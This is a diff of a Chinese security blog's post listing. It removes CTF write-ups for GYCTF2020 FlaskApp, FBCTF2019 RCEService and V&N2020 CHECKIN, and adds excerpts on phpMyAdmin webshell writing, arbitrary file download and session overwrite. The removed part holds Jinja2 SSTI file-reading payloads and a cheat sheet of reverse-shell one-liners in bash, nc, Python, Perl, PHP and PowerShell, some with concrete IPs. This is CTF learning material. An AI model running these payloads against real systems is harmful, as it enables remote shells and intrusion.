-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503171137795.png" alt="image-20200503171137795"></p>
-<p>发现这是WSGI</p>
-<p>在加密界面输入12，解密解密成功回显12</p>
-<p>这里有个脚本</p>
-<blockquote>
-<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></blockquote>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503183556194.png" alt="image-20200503183556194"></p>
-<p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;</code></p>
-<p>最后用切片操作读取flag</p>
-<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
-<p>下面是一些链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zaqzzz/p/10251892.html">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>
+写入shell，网站目录可以在备份文件中找到。
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/" data-id="ckemqkeaz001dasty3l72ermn" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[FBCTF2019]RCEService" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/02/%5BFBCTF2019%5DRCEService/" class="article-date">
-  <time datetime="2020-05-02T11:46:52.215Z" itemprop="datePublished">2020-05-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200502191258431.png" alt="image-20200502191258431"></p>
-<p>当输入{“cmd”:”ls”}有回显，但是不能读取。</p>
-<p>本来想拼接字符串的但是没有成功。</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5399">https://xz.aliyun.com/t/5399</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/" data-id="ckemqkeb0001easty1sty79uy" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[V&amp;N2020 公开赛]CHECKIN" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/02/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN/" class="article-date">
-  <time datetime="2020-05-02T11:12:23.753Z" itemprop="datePublished">2020-05-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>看到这题的时候并不会做。考点是反弹shell。</p>
-<p>收集一点可能用上的反弹shell命令</p>
-<p><strong><em>1\</em></strong>|<strong><em>0**</em></strong>bash**</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><strong><em>2\</em></strong>|<strong><em>0**</em></strong>nc**</p>
-<pre><code>nc -e /bin/sh ip port</code></pre><p><strong><em>3\</em></strong>|<strong><em>0**</em></strong>python**</p>
-<pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p><strong><em>4\</em></strong>|<strong><em>0**</em></strong>perl**</p>
-<pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
-perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.224.117:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p><strong><em>5\</em></strong>|<strong><em>0**</em></strong>php**</p>
-<pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><strong><em>6\</em></strong>|<strong><em>0**</em></strong>PowerShell**</p>
-<pre><code>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#39;$c=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%&#123;0&#125;;while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&gt;&amp;1 | Out-String );$sb2=$sb+&#39;&#39;PS &#39;&#39;+(pwd).Path+&#39;&#39;&gt; &#39;&#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()&#125;;$c.Close()&#39;))
-
-powershell -nop -enc &#123;reverse shell command&#125;</code></pre><p>参考：<a target="_blank" rel="noopener" href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
-<p>连入后因为：</p>
-<p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</p>
-<p>执行</p>
-<p><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/&#39;+str(j)) for i in range(20) for j in range(10)];&quot;</code></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/02/[V&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/" data-id="ckemqkeb5001lasty22mvdwqo" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%EF%BC%8Cpython/">WEB，python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb/">攻防世界，web</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jarvis-OJ/" rel="tag">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cphp/" rel="tag">WEB，php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cupload/" rel="tag">WEB，upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%EF%BC%8CJARvis-OJ/" rel="tag">web，JARvis OJ</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Jarvis-OJ/" style="font-size: 13.33px;">Jarvis OJ</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/WEB/" style="font-size: 20px;">WEB</a> <a href="/tags/WEB%EF%BC%8Cphp/" style="font-size: 10px;">WEB，php</a> <a href="/tags/WEB%EF%BC%8Cupload/" style="font-size: 13.33px;">WEB，upload</a> <a href="/tags/buuctf/" style="font-size: 10px;">buuctf</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/web%EF%BC%8CJARvis-OJ/" style="font-size: 10px;">web，JARvis OJ</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/08/11/%5BMRCTF2020%5DEzpop_Reveng/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/">(no title)</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 小叹<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+二：phpadmin1.root/root弱口令进入后台。尝试使用命令写入shell。
+尝试利用outfile写入，显然失败了。产生报错，show global variables like ‘%secure%’;查看—secure-file-prive变量配置，变量值为NULL不可读写，且变量只读不可编辑。
 
 
 
 
-<script src="/js/script.js"></script>
 
 
 
 
-  </div>
-</body>
-</html>
+Va ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/09/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E8%BF%87%E7%A8%8B/" title="记一次任意文件下载绕过过程">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次任意文件下载绕过过程"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/09/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E8%BF%87%E7%A8%8B/" title="记一次任意文件下载绕过过程">记一次任意文件下载绕过过程</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2020-09-05T03:25:01.000Z" title="Created 2020-09-05 11:25:01">2020-09-05</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/web/">web</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E8%BD%AC%E8%BD%BD/">转载</a></span></div><div class="content">挖掘过程转载：https://www.sec-in.com/article/486  一般来说，在文件下载/查看功能处，当文件名参数可控，且系统未对参数进行过滤或者过滤不全时，就可以实现下载服务器上的任何文件，产生任意文件下载漏洞。  一般可以通过相关的业务关键字（例如download、filename等）或者相关的操作类（例如InputStream、File等）快速定位相关的模块进行审计挖掘。  前段时间审计某项目时发现一处任意文件下载的绕过。  系统基于Springboot进行开发，首先是发现任意文件下载接口:
+@Value(&quot;$&#123;CERTIFICATE.PATH&#125;&quot;)
+private String uploadPath;
+
+@GetMapping(&quot;/downloadFile.do&quot;)
+public void uploadFileDownload(HttpServletResponse response,String fileName) throws IOException &#123;
+    ServletOutpu ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/09/04/session%E8%A6%86%E7%9B%96/" title="session覆盖学习">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="session覆盖学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/09/04/session%E8%A6%86%E7%9B%96/" title="session覆盖学习">session覆盖学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2020-09-04T12:50:01.000Z" title="Created 2020-09-04 20:50:01">2020-09-04</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web/">web</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">session覆盖上次挖到的某大学信息门户任意用户越权漏洞用的就是这个原理，所以想记录一下。
+吐槽： 我交了五次报告都没让我过，EDUSRC的审核太强了吧。
+例如登录、忘记密码、查看个人信息等。一般情况下，相关的业务凭证存在设计缺陷的话，会存在类似平行/垂直越权等安全问题。常见的业务凭证及越权场景有：
+
+用户身份id（userid，例如通过userid越权查看用户信息）
+对象id（fileid，例如通过fileid越权查看其他用户的备案资料（身份证、手机号、住址等））
+基于文件名（例如可以遍历时间戳组成的文件名获取用户订单）
+Cookie中的字段（例如增加user=admin，即可垂直越权访问管理员模块）
+Session中的内容（例如session覆盖）
+…
+
+  一般在测试时，可以通过寻找相关的凭证，通过遍历、猜解等方式，进行业务逻辑缺陷的发掘。  前段时间审计某项目时发现一处结合忘记密码发送短信功能进行session覆盖越权的业务缺陷，下面是具体的发现过程。
+正题在实际代码中，用户登入后会将用户凭证于session会话进行绑定，当访问业务接口时，因为业务凭证不再是userid这种可 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name"></div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/York145"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/York145" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2192557290@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">唯信仰与日月亘古不变</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/28/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="No title"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/2021/07/28/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="No title">No title</a><time datetime="2021-07-28T08:03:56.288Z" title="Created 2021-07-28 16:03:56">2021-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK红队评估实战靶场（一） 练习"/></a><div class="content"><a class="title" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习">ATT&amp;CK红队评估实战靶场（一） 练习</a><time datetime="2021-07-24T11:31:01.000Z" title="Created 2021-07-24 19:31:01">2021-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化漏洞学习"/></a><div class="content"><a class="title" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习">Shiro反序列化漏洞学习</a><time datetime="2021-06-13T11:16:01.000Z" title="Created 2021-06-13 19:16:01">2021-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java agent学习"/></a><div class="content"><a class="title" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习">Java agent学习</a><time datetime="2021-05-09T06:31:01.000Z" title="Created 2021-05-09 14:31:01">2021-05-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透--远程桌面"/></a><div class="content"><a class="title" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面">内网渗透--远程桌面</a><time datetime="2021-04-29T12:05:01.000Z" title="Created 2021-04-29 20:05:01">2021-04-29</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>Categories</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Java/"><span class="card-category-list-name">Java</span><span class="card-category-list-count">12</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/web/"><span class="card-category-list-name">web</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%86%85%E7%BD%91/"><span class="card-category-list-name">内网</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/"><span class="card-category-list-name">转载</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%80%86%E5%90%91/"><span class="card-category-list-name">逆向</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%97%B2%E8%B0%88/"><span class="card-category-list-name">闲谈</span><span class="card-category-list-count">1</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.22em; color: rgb(29, 11, 193)">内网</a><a href="/tags/%E6%82%A6%E8%AF%BB/" style="font-size: 1.45em; color: rgb(53, 52, 88)">悦读</a><a href="/tags/Java/" style="font-size: 1.38em; color: rgb(193, 190, 40)">Java</a><a href="/tags/%E9%97%B2%E8%B0%88/" style="font-size: 1.15em; color: rgb(83, 1, 193)">闲谈</a><a href="/tags/web/" style="font-size: 1.3em; color: rgb(191, 83, 93)">web</a><a href="/tags/java/" style="font-size: 1.22em; color: rgb(143, 71, 42)">java</a><a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 1.15em; color: rgb(100, 114, 150)">逆向</a><a href="/tags/%E8%BD%AC%E8%BD%BD/" style="font-size: 1.15em; color: rgb(126, 33, 118)">转载</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span><a class="card-more-btn" href="/archives/" title="More">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/07/"><span class="card-archive-list-date">七月 2021</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/06/"><span class="card-archive-list-date">六月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/05/"><span class="card-archive-list-date">五月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/04/"><span class="card-archive-list-date">四月 2021</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">三月 2021</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/02/"><span class="card-archive-list-date">二月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">十一月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/10/"><span class="card-archive-list-date">十月 2020</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">22</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">Last Push :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-07-29T02:40:51.227Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By null</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[image]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[link]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[code]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
